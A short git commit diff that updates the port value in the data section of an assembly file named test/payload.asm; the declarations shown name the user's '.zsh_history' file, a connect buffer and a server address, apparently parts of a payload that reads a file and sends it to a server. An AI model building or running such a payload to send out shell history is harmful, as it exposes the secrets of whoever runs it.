11511ef74449fceaf1e90ff067fe3252d3209e17
Maxenceee <72473014+Maxenceee@users.noreply.github.com>
2024-08-04 05:25:12 +0200

    Update payload.asm

--- test/payload.asm
+++ test/payload.asm
@@ -101,5 +101,5 @@ STATBUFFER		times 144 db 0
 CONNECT_BUFFER	times 16 db 0
 ; FILEPATH		times 1024 db 0
 FILEPATH		db '/home/maxence/.zsh_history', 0
-SERVER_PORT		dd 0x0
+SERVER_PORT		dd 0xba0b
 SERVER_ADDR		dw 0x0
